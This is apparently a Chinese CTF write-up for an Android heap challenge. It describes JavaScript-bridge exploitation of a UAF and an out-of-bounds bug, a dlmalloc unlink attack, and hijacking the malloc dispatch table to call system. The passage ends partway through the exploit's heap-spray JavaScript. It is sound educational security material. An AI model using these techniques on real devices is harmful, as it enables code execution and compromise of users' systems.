<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>avss 2024 allocator</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="/index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="/about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">blog</span> <span style="color:#83a598"><a href="/index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./avss 2024 allocator.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">avss 2024 allocator</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-04-21]</div>
    </header>
    <div class="layout-grid">
                <main><p>源码
http://androidxref.com/4.1.2/xref/bionic/libc/bionic/dlmalloc.c</p>
<p>菜单题，内存未清空、有8字节越界读写、uaf
通过jni调用实现的菜单功能，且实现了一个FileBase类，能够创建、读写、关闭文件</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">MainActivity </span><span style="color:#b48ead;">extends </span><span style="color:#a3be8c;">AppCompatActivity </span><span style="color:#eff1f5;">{
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    @</span><span style="color:#bf616a;">Override
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">protected void </span><span style="color:#8fa1b3;">onCreate</span><span style="color:#eff1f5;">(</span><span style="color:#ebcb8b;">Bundle </span><span style="color:#bf616a;">savedInstanceState</span><span style="color:#eff1f5;">) {
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">super</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">onCreate</span><span style="color:#eff1f5;">(savedInstanceState);
</span><span style="color:#eff1f5;">        </span><span style="color:#8fa1b3;">setContentView</span><span style="color:#eff1f5;">(</span><span style="color:#ebcb8b;">R</span><span style="color:#eff1f5;">.layout.activity_main);
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">if </span><span style="color:#eff1f5;">(</span><span style="color:#8fa1b3;">getIntent</span><span style="color:#eff1f5;">().</span><span style="color:#8fa1b3;">hasExtra</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">url</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">)) {
</span><span style="color:#eff1f5;">            </span><span style="color:#ebcb8b;">String</span><span style="color:#eff1f5;"> url </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">getIntent</span><span style="color:#eff1f5;">().</span><span style="color:#8fa1b3;">getStringExtra</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">url</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">            </span><span style="color:#ebcb8b;">Log</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">d</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">MainActivity</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">, </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Loading url: </span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#eff1f5;">url);
</span><span style="color:#eff1f5;">            </span><span style="color:#ebcb8b;">Intent</span><span style="color:#eff1f5;"> intent </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">Intent</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">, </span><span style="color:#ebcb8b;">MyWebViewActivity</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">class</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">            intent.</span><span style="color:#8fa1b3;">putExtra</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">url</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">, url);
</span><span style="color:#eff1f5;">            </span><span style="color:#8fa1b3;">startActivity</span><span style="color:#eff1f5;">(intent);
</span><span style="color:#eff1f5;">        } </span><span style="color:#b48ead;">else </span><span style="color:#eff1f5;">{
</span><span style="color:#eff1f5;">            </span><span style="color:#ebcb8b;">Log</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">d</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">MainActivity</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">, </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">no url</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        }
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">}
</span></pre>
<p><code>webView.getSettings().setJavaScriptEnabled(true);</code>允许执行js代码
<code>webView.getSettings().setAllowFileAccess(false);</code>禁止文件访问</p>
<p><code>MyJavaScriptInterface</code>是一个自定义的 JavaScript 接口类，允许网页中的 <code>JavaScript</code> 调用本地 Java 代码，这个类定义了一些与 JavaScript 交互的方法，封装菜单功能
<code>addJavascriptInterface(jsInterface, "_jsbridge")</code>将 <code>MyJavaScriptInterface</code> 类作为 JavaScript 的接口，网页中 <code>JavaScript</code> 可以通过 <code>_jsbridge</code>来调用 Java 方法</p>
<p>再往下cache啥的是禁用缓存
最后加载url网页</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">MyWebViewActivity </span><span style="color:#b48ead;">extends </span><span style="color:#a3be8c;">AppCompatActivity </span><span style="color:#eff1f5;">{
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    @</span><span style="color:#bf616a;">Override
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">protected void </span><span style="color:#8fa1b3;">onCreate</span><span style="color:#eff1f5;">(</span><span style="color:#ebcb8b;">Bundle </span><span style="color:#bf616a;">savedInstanceState</span><span style="color:#eff1f5;">) {
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">super</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">onCreate</span><span style="color:#eff1f5;">(savedInstanceState);
</span><span style="color:#eff1f5;">        </span><span style="color:#8fa1b3;">setContentView</span><span style="color:#eff1f5;">(</span><span style="color:#ebcb8b;">R</span><span style="color:#eff1f5;">.layout.activity_webview);
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">WebView</span><span style="color:#eff1f5;"> webView </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">findViewById</span><span style="color:#eff1f5;">(</span><span style="color:#ebcb8b;">R</span><span style="color:#eff1f5;">.id.mywebview);
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">String</span><span style="color:#eff1f5;"> url </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">getIntent</span><span style="color:#eff1f5;">().</span><span style="color:#8fa1b3;">getStringExtra</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">url</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">        webView.</span><span style="color:#8fa1b3;">getSettings</span><span style="color:#eff1f5;">().</span><span style="color:#8fa1b3;">setJavaScriptEnabled</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">true</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        webView.</span><span style="color:#8fa1b3;">getSettings</span><span style="color:#eff1f5;">().</span><span style="color:#8fa1b3;">setAllowFileAccess</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">false</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">MyJavaScriptInterface</span><span style="color:#eff1f5;"> jsInterface </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">MyJavaScriptInterface</span><span style="color:#eff1f5;">(</span><span style="color:#8fa1b3;">getApplicationContext</span><span style="color:#eff1f5;">());
</span><span style="color:#eff1f5;">        webView.</span><span style="color:#8fa1b3;">addJavascriptInterface</span><span style="color:#eff1f5;">(jsInterface, </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">_jsbridge</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">WebSettings</span><span style="color:#eff1f5;"> settings </span><span style="color:#c0c5ce;">=</span><span style="color:#eff1f5;"> webView.</span><span style="color:#8fa1b3;">getSettings</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        settings.</span><span style="color:#8fa1b3;">setCacheMode</span><span style="color:#eff1f5;">(</span><span style="color:#ebcb8b;">WebSettings</span><span style="color:#d08770;">.LOAD_NO_CACHE</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        webView.</span><span style="color:#8fa1b3;">loadUrl</span><span style="color:#eff1f5;">(url);
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">}
</span></pre>
<p>下面命令传入网页url</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">am start -n com.avss.testallocator/.MainActivity -e url http://127.0.0.1:8000/evil.html
</span></pre>
<p>apk实现都一样，运行环境分别在android 4/8/12上，对应堆管理器分别为<code>dlmallloc/jemalloc/scudo</code></p>
<p>题目本意是利用 uaf 打 Filebase 类，一开始以为要打堆管理，dlmalloc 打了 unlink，后两题赛后用 uaf 做的</p>
<h2 id="diao-shi-fang-fa">调试方法</h2><p>jemalloc 和 scudo 题目给的环境起不来，使用Android studio环境启动
选没有Google play的设备，才能获得 adb root</p>
<p>adb shell中<code>gdbserver attach</code>，使用<code>adb reverse</code>将安卓设备端口映射到主机，结合socat端口转发，将到主机的连接转发到gdbserver映射出来的端口，在docker中使用gdb remote连接</p>
<p><a href="../../pwn/glibc/0basic/docker%20%E8%BF%9E%E6%8E%A5%E5%AE%BF%E4%B8%BB%E6%9C%BA.md">docker 连接宿主机</a>
<a href="https://github.com/aYoung-CS/android_pwn_debug_scripts">调试使用到的脚本</a></p>
<h2 id="dlmalloc">dlmalloc</h2><p>堆风水，让可控堆块和filebase相邻申请，再利用8字节越界读 泄露filebase类中的指针 得到 libhello 基址</p>
<p>接着一直申请直到三个连续申请的堆块相邻排布在一块（通过检测下一个堆块头4字节内容判断），利用越界改size。释放前先喷对应size，保证能够获取 libc 地址；如果不成功就重来</p>
<p>最后unlink，伪造堆块 利用前向合并触发，往chunklist写入地址
得到任意地址读写原语</p>
<p>劫持执行流 利用 libc.so中 <code>__libc_malloc_dispatch</code>，这是一个二级指针，指向<code>__libc_malloc_default_dispatch</code>，这里指向一个函数表，依次存放<code>dlmalloc</code>，<code>dlfree</code>等函数指针。其中正好<code>__libc_malloc_dispatch</code>可写</p>
<p>通过修改<code>__libc_malloc_dispatch</code>，伪造函数表，控制<code>dlfree</code>为<code>system</code>执行命令</p>
<blockquote>
<p>连着gdb的时候 不知道为啥只要改完上述二级指针，js里后续delete等操作就没有执行到 被坑了好久</p>
</blockquote>
<blockquote>
<p>题目对应dlmalloc版本2.8.x，存在<code>ok_address()</code>地址检查，堆管理结构中有字段<code>least_addr</code>记录堆内存最低地址，unlink等操作中判断操作指针需要大于该地址，从而作为漏洞利用缓解措施。如果单独编译c/c++程序模拟题目操作会不满足该条件无法利用，但实际apk中该地址会小于实际chunklist地址，从而不影响利用</p>
</blockquote>
<h3 id="exp">exp</h3><pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">&lt;</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">hexToLE</span><span style="color:#c0c5ce;">(hexString){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">--) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">&lt;&lt;= </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ret </span><span style="color:#c0c5ce;">|= </span><span style="color:#96b5b4;">parseInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hexString</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">),</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">ret</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(number) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= &quot;&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">byte </span><span style="color:#c0c5ce;">= (</span><span style="color:#bf616a;">number </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">byte</span><span style="color:#c0c5ce;">.length == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">byte </span><span style="color:#c0c5ce;">= &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;+</span><span style="color:#bf616a;">byte</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">byte</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">number </span><span style="color:#c0c5ce;">&gt;&gt;= </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(s, n){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= &#39;&#39;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++)
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">s</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">genKey</span><span style="color:#c0c5ce;">(index){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.length == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">30</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)+</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">convertToASCII</span><span style="color:#c0c5ce;">(str) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">= &quot;&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.length; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">result </span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">result</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">chunk_fengshui</span><span style="color:#c0c5ce;">(){
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// spray
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">=-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx </span><span style="color:#c0c5ce;">== -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++){
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">s_index </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">.length == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">                    </span><span style="color:#bf616a;">s_index </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">AB</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">s_index</span><span style="color:#c0c5ce;">+&quot;</span><span style="color:#96b5b4;">\x61</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">leak_content_first </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">hexToLE</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">leak_content_first</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) == </span><span style="color:#d08770;">0x6b </span><span style="color:#c0c5ce;">&amp;&amp; </span><span style="color:#bf616a;">leak_content_first</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) == (&quot;</span><span style="color:#a3be8c;">4142</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#8fa1b3;">genKey</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">))){
</span><span style="color:#c0c5ce;">                    </span><span style="color:#bf616a;">leak_content_second </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">hexToLE</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">leak_content_second</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) == </span><span style="color:#d08770;">0x6b </span><span style="color:#c0c5ce;">&amp;&amp; </span><span style="color:#bf616a;">leak_content_second</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) == (&quot;</span><span style="color:#a3be8c;">4142</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#8fa1b3;">genKey</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">))){
</span><span style="color:#c0c5ce;">                        </span><span style="color:#bf616a;">found_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                        </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                    }
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
